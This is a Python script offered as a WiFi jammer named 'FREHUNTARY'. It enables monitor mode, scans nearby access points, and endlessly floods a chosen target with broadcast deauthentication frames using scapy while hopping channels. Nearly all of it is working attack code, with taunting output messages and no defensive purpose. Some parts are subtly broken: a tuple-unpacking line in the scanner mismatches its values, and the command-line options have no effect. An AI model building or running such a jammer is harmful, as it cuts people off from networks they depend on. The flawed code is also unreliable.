#!/usr/bin/env python3  
# ███████╗██████╗ ███████╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗ █████╗ ██████╗ ██╗   ██╗  
# ██╔════╝██╔══██╗██╔════╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗ ██╔╝  
# █████╗  ██████╔╝█████╗  ███████║██║   ██║██╔██╗ ██║   ██║   ███████║██████╔╝ ╚████╔╝   
# ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══██║██╔══██╗  ╚██╔╝    
# ██║     ██║  ██║███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ██║  ██║██║  ██║   ██║     
# ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝     
# FREHUNTARY V0.1 - BY Rip70022/craxterpy
# This script is a WiFi jammer that sends deauth packets to a target AP.
# It can target a specific AP or all APs in range.
# It also supports channel hopping and monitor mode. 

import os  
import sys  
import time  
import signal  
from multiprocessing import Process, Queue  
from scapy.all import *  
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap  
import subprocess  
import re  
import argparse  
from colorama import Fore, Style  

# --- CONFIGURATION ---  
INTERFACE = "wlan0"  # Default interface (monitor mode enabled)  
MONITOR_INTERFACE = "wlan0mon"  # Monitor mode interface name  
DEAUTH_COUNT = 999999999  # Infinite deauth packets (until stopped)  
CHANNEL_HOP_INTERVAL = 2  # Channel hopping interval (seconds)  
AP_MAC = None  # Target AP BSSID (None for all)  
CLIENT_MAC = "ff:ff:ff:ff:ff:ff"  # Broadcast to all clients  

class WiFiNuclearOption:  
    def __init__(self):  
        self.stop_signal = False  
        self.channel_queue = Queue()  
        self.current_channel = 1  
        signal.signal(signal.SIGINT, self.signal_handler)  
        signal.signal(signal.SIGTERM, self.signal_handler)  

    def signal_handler(self, sig, frame):  
        print(f"\n{Fore.RED}[!] Radiation leak detected! Shutting down reactor...{Style.RESET_ALL}")  
        self.stop_signal = True  
        subprocess.run(["airmon-ng", "stop", MONITOR_INTERFACE], stdout=subprocess.DEVNULL)  
        sys.exit(0)  

    def _enable_monitor_mode(self):  
        print(f"{Fore.YELLOW}[~] Activating dark matter protocols on {INTERFACE}...{Style.RESET_ALL}")  
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)  
        subprocess.run(["ip", "link", "set", INTERFACE, "down"], stdout=subprocess.DEVNULL)  
        subprocess.run(["iw", INTERFACE, "set", "monitor", "control"], stdout=subprocess.DEVNULL)  
        subprocess.run(["ip", "link", "set", INTERFACE, "up"], stdout=subprocess.DEVNULL)  
        subprocess.run(["iw", INTERFACE, "set", "channel", str(self.current_channel)], stdout=subprocess.DEVNULL)  

    def _channel_hopper(self):  
        while not self.stop_signal:  
            try:  
                channel = self.current_channel % 14 + 1  
                self.current_channel = channel  
                subprocess.run(["iwconfig", MONITOR_INTERFACE, "channel", str(channel)], stdout=subprocess.DEVNULL)  
                self.channel_queue.put(channel)  
                time.sleep(CHANNEL_HOP_INTERVAL)  
            except Exception as e:  
                print(f"{Fore.RED}[!] Channel hopping failed: {e}{Style.RESET_ALL}")  

    def _scan_ap(self):  
        print(f"{Fore.CYAN}[*] Deploying quantum scanners...{Style.RESET_ALL}")  
        airodump = subprocess.Popen(["airodump-ng", MONITOR_INTERFACE], stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)  
        time.sleep(5)  
        airodump.terminate()  
        output, _ = airodump.communicate()  
        aps = []  
        for line in output.decode().split('\n'):  
            if "BSSID" in line:  
                continue  
            match = re.search(r"(([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))\s+(-?\d+)\s+(\d+)\s+([^\s]+)\s+(\w+)", line)  
            if match:  
                bssid, channel, speed, privacy, _ = match.group(1), match.group(4), match.group(5), match.group(7)  
                aps.append((bssid, channel, speed, privacy))  
        return aps  

    def _launch_attack(self, ap_bssid):  
        print(f"{Fore.MAGENTA}[*] Initiating electromagnetic pulse on {ap_bssid}...{Style.RESET_ALL}")  
        pkt = RadioTap() / Dot11(addr1=CLIENT_MAC, addr2=ap_bssid, addr3=ap_bssid) / Dot11Deauth(reason=7)  
        sendp(pkt, iface=MONITOR_INTERFACE, count=DEAUTH_COUNT, inter=0.1, loop=1, verbose=0)  

    def run(self):  
        if os.getuid() != 0:  
            print(f"{Fore.RED}[!] You think you're clever? Run me as root!{Style.RESET_ALL}")  
            sys.exit(1)  

        self._enable_monitor_mode()  
        aps = self._scan_ap()  

        if not aps:  
            print(f"{Fore.RED}[!] No APs detected. The void is silent...{Style.RESET_ALL}")  
            sys.exit(1)  

        print(f"{Fore.GREEN}[+] Detected {len(aps)} access points:{Style.RESET_ALL}")  
        for idx, (bssid, channel, _, _) in enumerate(aps):  
            print(f"{Fore.WHITE}[{idx}] {bssid} (Channel {channel}){Style.RESET_ALL}")  

        target_idx = int(input(f"{Fore.BLUE}[?] Select target (0-{len(aps)-1}): {Style.RESET_ALL}"))  
        ap_bssid, channel, _, _ = aps[target_idx]  
        self.current_channel = int(channel)  

        channel_hopper = Process(target=self._channel_hopper)  
        channel_hopper.start()  

        try:  
            while not self.stop_signal:  
                self._launch_attack(ap_bssid)  
                time.sleep(0.1)  
        except KeyboardInterrupt:  
            self.signal_handler(None, None)  

if __name__ == "__main__":  
    parser = argparse.ArgumentParser(description="FREHUNTARY - WiFi Nuclear Disruptor V0.1")  
    parser.add_argument("-i", "--interface", help="Wireless interface (default: wlan0)", default=INTERFACE)  
    parser.add_argument("-c", "--channel", help="Specific channel to attack", type=int)  
    args = parser.parse_args()  

    if args.channel:  
        WiFiNuclearOption.current_channel = args.channel  

    print(f"""{Fore.RED}  
    ███████╗██████╗ ███████╗██╗  ██╗██╗   ██╗███╗   ██╗████████╗ █████╗ ██████╗ ██╗   ██╗  
    ██╔════╝██╔══██╗██╔════╝██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔══██╗██╔══██╗╚██╗ ██╔╝  
    █████╗  ██████╔╝█████╗  ███████║██║   ██║██╔██╗ ██║   ██║   ███████║██████╔╝ ╚████╔╝                 V0.1
    ██╔══╝  ██╔══██╗██╔══╝  ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══██║██╔══██╗  ╚██╔╝    _______------------------_______
    ██║     ██║  ██║███████╗██║  ██║╚██████╔╝██║ ╚████║   ██║   ██║  ██║██║  ██║   ██║     
    ╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
    {Style.RESET_ALL}""")  

    nuke = WiFiNuclearOption()  
    nuke.run()  
